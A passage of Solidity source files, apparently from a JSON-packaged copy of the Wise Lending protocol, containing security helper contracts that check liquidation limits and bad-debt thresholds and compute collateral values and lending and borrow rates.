function canLiquidate(\n        uint256 _borrowETHTotal,\n        uint256 _weightedCollateralETH\n    )\n        public\n        pure\n    {\n        if (_borrowETHTotal < _weightedCollateralETH) {\n            revert LiquidationDenied();\n        }\n    }\n\n    /**\n     * @dev Helper function for liquidation checking\n     * return amount of receiving shares for liquidator.\n     * Has to be smaller 50% when no bad debt occurs.\n     */\n    function checkMaxShares(\n        uint256 _nftId,\n        address _tokenToPayback,\n        uint256 _borrowETHTotal,\n        uint256 _unweightedCollateralETH,\n        uint256 _shareAmountToPay\n    )\n        public\n        view\n    {\n        uint256 totalSharesUser = WISE_LENDING.getPositionBorrowShares(\n            _nftId,\n            _tokenToPayback\n        );\n\n        uint256 maxShares = checkBadDebtThreshold(_borrowETHTotal, _unweightedCollateralETH)\n            ? totalSharesUser\n            : totalSharesUser * MAX_LIQUIDATION_50 / PRECISION_FACTOR_E18;\n\n        if (_shareAmountToPay <= maxShares) {\n            return;\n        }\n\n        revert TooManyShares();\n    }\n\n    /**\n     * @dev Helper function for liquidation checking\n     * if postion has bad debt.\n     */\n    function checkBadDebtThreshold(\n        uint256 _borrowETHTotal,\n        uint256 _unweightedCollateral\n    )\n        public\n        pure\n        returns (bool)\n    {\n        return _borrowETHTotal * PRECISION_FACTOR_E18\n            >= _unweightedCollateral * BAD_DEBT_THRESHOLD;\n    }\n\n    /**\n     * @dev Helper function computing lending\n     * token amount for {_poolToken}.\n     */\n    function getPositionLendingAmount(\n        uint256 _nftId,\n        address _poolToken\n    )\n        public\n        view\n        returns (uint256)\n    {\n        return WISE_LENDING.cashoutAmount(\n            {\n                _poolToken: _poolToken,\n                _shares: WISE_LENDING.getPositionLendingShares(\n                    _nftId,\n                    _poolToken\n                )\n            }\n        );\n    }\n\n    /**\n     * @dev Helper function computing borrow\n     * token amount for {_poolToken}.\n     */\n    function getPositionBorrowAmount(\n        uint256 _nftId,\n        address _poolToken\n    )\n        public\n        view\n        returns (uint256)\n    {\n        return WISE_LENDING.paybackAmount(\n            _poolToken,\n            WISE_LENDING.getPositionBorrowShares(\n                _nftId,\n                _poolToken\n            )\n        );\n    }\n\n    /**\n     * @dev Helper function checking the owner\n     * of {_nftId}. Reverts if owner is invalid.\n     */\n    function checkOwnerPosition(\n        uint256 _nftId,\n        address _caller\n    )\n        public\n        view\n    {\n        if (POSITION_NFTS.isOwner(\n            _nftId,\n            _caller\n        ) == false) {\n            revert NotOwner();\n        }\n    }\n\n    /**\n     * @dev Wrapper function returning the borrow\n     * rate from pool with token {_poolToken}.\n     */\n    function getBorrowRate(\n        address _poolToken\n    )\n        public\n        view\n        returns (uint256)\n    {\n        return WISE_LENDING.borrowPoolData(_poolToken).borrowRate;\n    }\n\n    /**\n     * @dev View function returning the lending\n     * rate from pool with token {_poolToken}.\n     */\n    function getLendingRate(\n        address _poolToken\n    )\n        public\n        view\n        returns (uint256)\n    {\n        uint256 pseudoTotalPool = WISE_LENDING.getPseudoTotalPool(\n            _poolToken\n        );\n\n        if (pseudoTotalPool == 0) {\n            return 0;\n        }\n\n        uint256 adjustedRate = getBorrowRate(_poolToken)\n            * (PRECISION_FACTOR_E18 - WISE_LENDING.globalPoolData(_poolToken).poolFee)\n            / PRECISION_FACTOR_E18;\n\n        return adjustedRate\n            * WISE_LENDING.getPseudoTotalBorrowAmount(_poolToken)\n            / pseudoTotalPool;\n    }\n\n    /**\n     * @dev Internal helper function calculating\n     * the possible withdraw amount of {_poolToken}\n     * under current borrow and collateral amount\n     * of {_nftId}.\n     */\n    function _getPossibleWithdrawAmount(\n        uint256 _nftId,\n        address _poolToken,\n        uint256 _interval\n    )\n        internal\n        view\n        returns (uint256)\n    {\n        uint256 term = _overallETHBorrow(_nftId, _interval)\n            * PRECISION_FACTOR_E18\n            / BORROW_PERCENTAGE_CAP;\n\n        uint256 withdrawETH = PRECISION_FACTOR_E18\n            * (_overallETHCollateralsWeighted(_nftId, _interval) - term)\n            / WISE_LENDING.lendingPoolData(_poolToken).collateralFactor;\n\n        return WISE_ORACLE.getTokensFromETH(\n            _poolToken,\n            withdrawETH\n        );\n    }\n\n    /**\n     * Locking or unlocking all pools for borrow\n     * and deposit actions. Performs action for\n     * all pools.\n     */\n    function _setPoolState(\n        bool _state\n    )\n        internal\n    {\n        uint256 i;\n        uint256 len = FEE_MANAGER.getPoolTokenAddressesLength();\n\n        while(i < len) {\n\n            wasBlacklisted[\n                FEE_MANAGER.getPoolTokenAdressesByIndex(i)\n            ] = _state;\n\n            unchecked {\n                ++i;\n            }\n        }\n    }\n\n    /**\n     * @dev Wrapper for {_checkBlacklisted}.\n     */\n    function _checkPoolCondition(\n        address _poolToken\n    )\n        internal\n        view\n    {\n        if (_checkBlacklisted(_poolToken) == true) {\n            revert TokenBlackListed();\n        }\n    }\n\n    /**\n     * @dev Internal helper checking of success\n     * for a low level byte call of a function\n     * with {.call()}.\n     */\n    function _checkSuccess(\n        bool _success\n    )\n        internal\n        pure\n    {\n        if (_success == false) {\n            revert SecuritySwapFailed();\n        }\n    }\n}"
    },
    {
      "filename": "contracts/WiseSecurity/WiseSecurityHelper.sol",
      "content": "// SPDX-License-Identifier: -- WISE --\n\npragma solidity =0.8.24;\n\nimport \"./WiseSecurityDeclarations.sol\";\n\nabstract contract WiseSecurityHelper is WiseSecurityDeclarations {\n\n    /**\n     * @dev Read function returning weighted and\n     * and unweighted total collateral of a\n     * postion with {_nftId} (unweighted means\n     * collateral factor equals 1E18).\n     */\n    function overallETHCollateralsBoth(\n        uint256 _nftId\n    )\n        public\n        view\n        returns (uint256, uint256)\n    {\n        uint256 amount;\n        uint256 weightedTotal;\n        uint256 unweightedAmount;\n        address tokenAddress;\n\n        uint256 i;\n        uint256 l = WISE_LENDING.getPositionLendingTokenLength(\n            _nftId\n        );\n\n        while (i < l) {\n\n            tokenAddress = WISE_LENDING.getPositionLendingTokenByIndex(\n                _nftId,\n                i\n            );\n\n            amount = getFullCollateralETH(\n                _nftId,\n                tokenAddress\n            );\n\n            weightedTotal += amount\n                * WISE_LENDING.lendingPoolData(tokenAddress).collateralFactor\n                / PRECISION_FACTOR_E18;\n\n            unweightedAmount += amount;\n\n            unchecked {\n                ++i;\n            }\n        }\n\n        return (\n            weightedTotal,\n            unweightedAmount\n        );\n    }\n\n    /**\n     * @dev Read function returning weighted\n     *  total collateral of a postion with {_nftId}.\n     */\n    function overallETHCollateralsWeighted(\n        uint256 _nftId\n    )\n        public\n        view\n        returns (uint256 weightedTotal)\n    {\n        address tokenAddress;\n\n        uint256 i;\n        uint256 l = WISE_LENDING.getPositionLendingTokenLength(\n            _nftId\n        );\n\n        while (i < l) {\n\n            tokenAddress = WISE_LENDING.getPositionLendingTokenByIndex(\n                _nftId,\n                i\n            );\n\n            _checkPoolCondition(\n                tokenAddress\n            );\n\n            weightedTotal += WISE_LENDING.lendingPoolData(tokenAddress).collateralFactor\n                * getFullCollateralETH(\n                    _nftId,\n                    tokenAddress\n                ) / PRECISION_FACTOR_E18;\n\n            unchecked {\n                ++i;\n            }\n        }\n    }\n\n    /**\n     * @dev Read function returning unweighted\n     *  total collateral of a postion with {_nftId}\n     * (unweighted means collateral factor equals 1E18).\n     */\n    function overallETHCollateralsBare(\n        uint256 _nftId\n    )\n        public\n        view\n        returns (uint256 amount)\n    {\n        address tokenAddress;\n\n        uint256 i;\n        uint256 l = WISE_LENDING.getPositionLendingTokenLength(\n            _nftId\n        );\n\n        while (i < l) {\n\n            tokenAddress = WISE_LENDING.getPositionLendingTokenByIndex(\n                _nftId,\n                i\n            );\n\n            amount += getFullCollateralETH(\n                _nftId,\n                tokenAddress\n            );\n\n            unchecked {\n                ++i;\n            }\n        }\n    }\n\n    /**\n     * @dev Internal calculation function returning\n     * the updated weighted collateral amount of a\n     * postion with {_nftId}. Result can be\n     * extrapolated linear with length {_interval}.\n     */\n    function _overallETHCollateralsWeighted(\n        uint256 _nftId,\n        uint256 _interval\n    )\n        internal\n        view\n        returns (uint256 weightedTotal)\n    {\n        uint256 i;\n        address tokenAddress;\n\n        uint256 l = WISE_LENDING.getPositionLendingTokenLength(\n            _nftId\n        );\n\n        while (i < l) {\n\n            tokenAddress = WISE_LENDING.getPositionLendingTokenByIndex(\n                _nftId,\n                i\n            );\n\n            _checkPoolCondition(\n                tokenAddress\n            );\n\n            weightedTotal += WISE_LENDING.lendingPoolData(tokenAddress).collateralFactor\n                * _getCollateralOfTokenETHUpdated(\n                    _nftId,\n                    tokenAddress,\n                    _interval\n                ) / PRECISION_FACTOR_E18;\n\n            unchecked {\n                ++i;\n            }\n        }\n    }\n\n    /**\n     * @dev Read function returning the full bare\n     * collateral amount of a {_poolToken} from a\n     * {_nftId}. Full means sum of private and\n     * public added funds.\n     */\n    function getFullCollateralETH(\n        uint256 _nftId,\n        address _poolToken\n    )\n        public\n        view\n        returns (uint256 ethCollateral)\n    {\n        ethCollateral = _getTokensInEth(\n            _poolToken,\n            WISE_LENDING.getPureCollateralAmount(\n                _nftId,\n                _poolToken\n            )\n        );\n\n        if (_isUncollateralized(_nftId, _poolToken) == true) {\n            return ethCollateral;\n        }\n\n        if (WISE_LENDING.getPositionLendingShares(_nftId, _poolToken) == 0) {\n            return ethCollateral;\n        }\n\n        ethCollateral += getETHCollateral(\n            _nftId,\n            _poolToken\n        );\n    }\n\n    /**\n     * @dev Wrapper function checking if a supplied\n     * fund is uncollateralized.\n     */\n    function _isUncollateralized(\n        uint256 _nftId,\n        address _poolToken\n    )\n        internal\n        view\n        returns (bool)\n    {\n        return WISE_LENDING.isUncollateralized(\n            _nftId,\n            _poolToken\n        );\n    }\n\n    /**\n     * @dev Read function returning the full\n     * collateral amount of a {_poolToken} from a\n     * {_nftId} updated to current values.\n     * Full means sum of private and public added\n     * funds. Can be extrapolated linear within\n     * {_interval}.\n     */\n    function _getCollateralOfTokenETHUpdated(\n        uint256 _nftId,\n        address _poolToken,\n        uint256 _interval\n    )\n        internal\n        view\n        returns (uint256 ethCollateral)\n    {\n        ethCollateral = _getTokensInEth(\n            _poolToken,\n            WISE_LENDING.getPureCollateralAmount(\n                _nftId,\n                _poolToken\n            )\n        );\n\n        if (_isUncollateralized(_nftId, _poolToken) == true) {\n            return ethCollateral;\n        }\n\n        ethCollateral += getETHCollateralUpdated(\n            _nftId,\n            _poolToken,\n            _interval\n        );\n    }\n\n    /**\n     * @dev Read function returning the full\n     * (private and public) collateral amount\n     * of a {_poolToken} from a {_nftId} updated\n     * to current values. Can be extrapolated\n     * linear within {_interval}.\n     */\n    function getETHCollateralUpdated(\n        uint256 _nftId,\n        address _poolToken,\n        uint256 _interval\n    )\n        public\n        view\n        returns (uint256)\n    {\n        uint256 lendingShares = WISE_LENDING.getPositionLendingShares(\n            _nftId,\n            _poolToken\n        );\n\n        if (lendingShares == 0) {\n            return 0;\n        }\n\n        uint256 currentTotalLendingShares = WISE_LENDING.getTotalDepositShares(\n            _poolToken\n        );\n\n        uint256 updatedPseudo = _getUpdatedPseudoPool(\n            _poolToken,\n            _interval\n        );\n\n        uint256 updatedToken = lendingShares\n            * updatedPseudo\n            / currentTotalLendingShares;\n\n        return _getTokensInEth(\n            _poolToken,\n            updatedToken\n        );\n    }\n\n    /**\n     * @dev Read function returning the public\n     * collateral amount of a {_poolToken} from a"
    }
  ]
}